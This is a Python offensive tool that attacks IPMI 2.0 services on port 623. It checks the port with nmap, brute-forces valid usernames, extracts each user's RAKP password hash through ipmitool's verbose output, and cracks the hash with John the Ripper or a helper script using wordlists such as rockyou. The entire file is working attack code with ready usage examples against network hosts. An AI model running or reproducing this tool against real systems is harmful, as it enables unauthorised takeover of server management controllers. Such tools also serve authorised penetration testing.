#!/usr/bin/python3
# author: c0rnf13ld
# Como cuando te banea por salir del server xD
# Puede ser pa?

import sys, signal, subprocess, os, shutil, argparse, shlex, re, socket, time, threading, nmap
from colorama import Fore, init

init(autoreset=True)

# colors
magenta, yellow, lgyellow, lgcyan, lgred = Fore.MAGENTA, Fore.YELLOW, Fore.LIGHTYELLOW_EX, Fore.LIGHTCYAN_EX, Fore.LIGHTRED_EX

status = f"{yellow}[{lgcyan}*{yellow}]"
error = f"{lgred}[{lgyellow}!{lgred}]{yellow}"

def checkStatusParams(host, port, user_wordlist, password_wordlist, user, output_hash_file, crack, output_cracked):

	if not user and type(user_wordlist) == list:
		print(f"{status} Using the list of users that the {lgcyan}script{yellow} has by default")
		time.sleep(1)

	if password_wordlist:
		if not os.path.isfile(password_wordlist):
			print(f"{error} The password wordlist: {lgcyan}{password_wordlist}{yellow} is invalid"); sys.exit()

	if user_wordlist:
		try:
			if not os.path.isfile(user_wordlist):
				print(f"{error} The user wordlist: {lgcyan}{user_wordlist}{yellow} is invalid"); sys.exit()
		except Exception:
			pass

	if crack and not password_wordlist:
		print(f"{error} To use the {lgcyan}cracking mode{yellow} you must provide a {lgcyan}wordlist{yellow} with the {lgcyan}--password-wordlist{yellow} parameter."); sys.exit()
	if crack and not output_hash_file:
		print(f"{error} To use the {lgcyan}cracking mode{yellow} you must provide the {lgcyan}--output-hash{yellow} parameter to save the hash and then crack it."); sys.exit()

	if crack == "python":
		if not output_cracked:
			print(f"{error} To use {lgcyan}python cracking{yellow} mode you must provide the {lgcyan}--output-cracked{yellow} parameter."); sys.exit()

def arguments():
	parser = argparse.ArgumentParser(
		formatter_class=argparse.RawDescriptionHelpFormatter,
		epilog=f"""
Examples:
	python3 {sys.argv[0]} --host 192.168.1.12 -c john -oH hash -pW /usr/share/wordlists/rockyou.txt
	python3 {sys.argv[0]} --host 192.168.1.12 -oH hash
	python3 {sys.argv[0]} --host 192.168.1.12 -uW /opt/SecLists/Usernames/cirt-default-usernames.txt -oH hash
	python3 {sys.argv[0]} --host 192.168.1.12 -u root -c john -pW /usr/share/wordlists/rockyou.txt -oH hash
	python3 {sys.argv[0]} --host 192.168.1.12 -p 624 -uW /opt/SecLists/Usernames/cirt-default-usernames.txt -c python -pW /usr/share/wordlists/rockyou.txt -oH hash -oC crackedHash
		"""
	)

	req = parser.add_argument_group("Required Options")
	req.add_argument("--host", help="The host of the target", dest="host", metavar="<ip>", required=True)

	group = parser.add_mutually_exclusive_group()
	cracking_g = parser.add_argument_group("Cracking Options", "All these parameters are required if cracking mode is enabled.")

	cracking_g.add_argument("-oH", "--output-hash", help="Output hash file, This parameter is required if cracking parameter is enabled", dest="output_hash_file", metavar="/path/to/hash_output", default=False)
	cracking_g.add_argument("-oC", "--output-cracked", help="Output cracked hash file, This parameter is required if cracking with python is used.", dest="output_cracked", metavar="/path/to/cracked_hash", default=False)
	cracking_g.add_argument("-pW", "--password-wordlist", help="The password wordlist to crack the hash, This parameter is required if cracking parameter is enabled", dest="password_wordlist", metavar="/path/of/password_wordlist", default=False)

	group.add_argument("-uW", "--user-wordlist", help="The user wordlist to use, this is enabled by default if the user is False since the program has a small users dictionary by default.", dest="user_wordlist", metavar="/path/of/user_wordlist", default=["ADMIN", "admin", "Administrator", "root", "USERID", "guest", "Admin"])
	group.add_argument("-u", "--user", help="Valid user to extract the hash", dest="user", metavar="<user>", default=False)

	parser.add_argument("-p", "--port", help="The port where the service runs, by default: 623", dest="port", metavar="<port>", default="623")
	parser.add_argument("-c", "--crack", help="Choose an option to crack the hash, the -pW and -oH is required for this option", dest="crack", metavar="[john|python]", choices=["john", "python"], default=False)
	parser.add_argument("-d", "--delay", help="Delay between each request in case of errors, by default: 20", dest="delay", metavar="number of delay", default=20, type=int)
	parser.add_argument("-r", "--retries", help="User validation attempts in case of errors, by default: 2", dest="retries", metavar="number of retries", default=2, type=int)
	return parser.parse_args()

def checkConn(host, port): # check if the port is open with nmap, pip install python-nmap or ./requirements.sh
	print(f"{status} Checking if {magenta}port {lgcyan}{port}{yellow} for {magenta}host{yellow} {lgcyan}{host}{yellow} is active"); time.sleep(1.5)
	scanner = nmap.PortScanner()
	result = scanner.scan(host, port, '-sU')
	if result['scan'] == {} or result['scan'][host]['udp'][int(port)]['state'] == "closed":
		print(f"{error} The {lgcyan}port: {lgcyan}{port}{yellow} for {magenta}host: {host}{yellow} is closed"); sys.exit()

def getUserHash(host, port, user, output_hash_file, brute=False): # Get the user hash via ipmitool, sudo apt-get install ipmitool or ./requirements.sh
	output = subprocess.run(shlex.split(f"ipmitool -I lanplus -H {host} -p {port} -U {user} -P cornfield -vvv 2>&1"), capture_output=True)
	stderr, stdout = output.stderr.decode(), output.stdout.decode()
	if len(user) >= 16:
		return 0, 0

	if "illegal parameter" in stderr or "unauthorized name" in stderr:
		if brute:
			print(f"{error} Wrong {magenta}username {lgcyan}{user}" + " " * 100, end="\r")
			return 0, 0
		print(f"{error} Wrong {magenta}username"); sys.exit() # This is for --user parameter

	if "insufficient resources for session" in stderr:
		return 1, 0

	print(f"{status} The username: {lgcyan}{user}{yellow} is {lgcyan}valid" + " " * 50)

	data = re.findall(r"rakp2 mac input buffer \(.*\)\s+(?: .*?\n)+\>\> rakp2 mac key", stderr)[0]
	data = re.sub(f"rakp2 mac input buffer \(.*\)\n", "", data).replace("\n>> rakp2 mac key", "").replace("\n", "").split(" ")
	salt = ''.join(data)

	hash = re.findall(r"Key exchange auth code \[sha1\] : (.*?)\n?$", stdout)[0].replace("0x", "")
	final_hash = f"$rakp${salt}${hash}"
	if output_hash_file:
		print(f"{status} Saving {lgcyan}hash{yellow} for {magenta}user{yellow}: {lgcyan}{user}{yellow} in file: {yellow}\"{magenta}{output_hash_file}{yellow}\"")
		time.sleep(2)
		with open(output_hash_file, "w") as f:
			f.write(f"{host} {user}:{final_hash}")
			f.close()

	print(f"{status} The hash for {magenta}user{yellow}: {lgcyan}{user}")
	print(f"   {yellow}\_{magenta} {final_hash}")
	return 0, 1 # Return insu error False and valid user True

def readByChunk(f, full, chunk_size=1024 * 900):
	file_content = b""
	print(f"{status} Reading the {magenta}file{yellow} by chunks")
	while True:
		chunk = f.read(chunk_size)
		if chunk:
			file_content += chunk
		else:
			return file_content
		print(f"{status} Reading {lgcyan}Bytes{yellow}: {lgcyan}{str(len(file_content))}{yellow}/{magenta}{str(full)}", end="\r")

def cracking(crack, password_wordlist, output_hash_file, cracked_file):
	if crack == "john":
		print(f"{status} Starting the hash cracking with {lgcyan}john\n")
		time.sleep(2)
		subprocess.run(shlex.split(f"john --wordlist={password_wordlist} \"{output_hash_file}\""))
	if crack == "python":
		print(f"{status} Starting the hash cracking with {lgcyan}python\n")
		subprocess.run(shlex.split(f"python3 rakpcrk.py -f \"{output_hash_file}\" -w {password_wordlist} -o \"{cracked_file}\""))

def getHash(host, port, user, output_hash_file, retries, delay, brute=False):
	count = 0
	while True:
		insu, valid = getUserHash(host, port, user, output_hash_file, brute)
		if insu:
			if count == retries:
				print(f"{status} Maximum attempts made for the {magenta}user{yellow}: {lgcyan}{user}{yellow}, skipping..." + " " * (60 + len(user)), end="\r")
				time.sleep(2)
				return valid
			count += 1
			print(f"{error} Insufficient resources for session {lgred}error{yellow}, sleeping {lgcyan}{delay}{yellow} secs for {magenta}user{yellow}: {lgcyan}{user}{yellow} - attempt {magenta}[{lgcyan}{count}{magenta}]", end="\r")
			time.sleep(delay)
			continue
		else:
			return valid

def main():
	if os.getuid() != 0:
		print(f"{error} You must be {lgcyan}root{yellow} to run the {lgcyan}script"); sys.exit()

	args = arguments()
	host = args.host
	port = args.port
	user_wordlist = args.user_wordlist
	password_wordlist = args.password_wordlist
	user = args.user
	output_hash_file = args.output_hash_file
	output_cracked = args.output_cracked
	crack = args.crack
	retries = args.retries
	delay = args.delay

	checkConn(host, port)
	checkStatusParams(host, port, user_wordlist, password_wordlist, user, output_hash_file, crack, output_cracked)

	if user:
		while True:
			if getHash(host, port, user, output_hash_file, retries, delay): break
		if crack:
			cracking(crack, password_wordlist, output_hash_file, output_cracked) # Crack the hash

	elif user_wordlist:
		print(f"{status} {lgcyan}B{yellow}rute {lgcyan}F{yellow}orcing")
		time.sleep(1.5)
		if type(user_wordlist) == list: # Check if the user wordlist use the default wordlist
			print(f"{status} Number of retries: {lgcyan}{retries}")
			for user in user_wordlist:
				valid = getHash(host, port, user, output_hash_file, retries, delay, brute=True)
				if valid: break

		else: # Read by chunk not to demand the memory
			full_size = os.path.getsize(user_wordlist) # Get the full size of the user wordlist
			f = open(user_wordlist, "rb")
			f_content = readByChunk(f, full_size).decode(errors="ignore").split("\n") # Read in chunks, then decode and split by newlines
			f.close() # Close the user wordlist
			print(f"\n{status} Number of retries: {lgcyan}{retries}")
			for user in f_content:
				valid = getHash(host, port, user, output_hash_file, retries, delay, brute=True)
				if valid: break

		if crack:
			cracking(crack, password_wordlist, output_hash_file, output_cracked) # Crack the hash

def def_handler(signum, frame): # Ctrl + c
	print(f"\n\n{error} Exiting...\n"); sys.exit()

signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
	main()
